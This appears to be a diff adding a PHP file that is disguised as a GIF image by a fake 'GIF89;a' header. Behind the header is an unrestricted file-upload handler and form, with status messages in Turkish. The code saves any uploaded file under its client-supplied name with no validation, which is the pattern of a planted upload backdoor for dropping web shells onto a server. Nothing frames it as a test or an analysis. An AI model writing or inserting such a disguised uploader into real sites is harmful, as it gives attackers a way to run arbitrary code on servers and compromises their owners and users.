@@ -1,0 +1,22 @@
+GIF89;a
+<?
+if (!empty($_GET["upload"])) {
+	$uploaddir ="images/";
+		
+	$uploadfile = $_FILES['userfile']['name'];
+	
+	print "<pre>";	
+	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {						
+		echo "Dosya ba?ar? ile y?klendi. ";								
+	} 	else {			
+		print "Dosya y?klenemedi. Tekrar deneyiniz";			
+		}
+	print "</pre>";
+}
+
+?>
+
+<form enctype="multipart/form-data" action="upload.php?upload=1" method="post"> <input type="hidden" name="MAX_FILE_SIZE" value="30000" />
+	Select image: <input name="userfile" type="file"/>
+	<input type="submit" value="Upload" />
+</form>
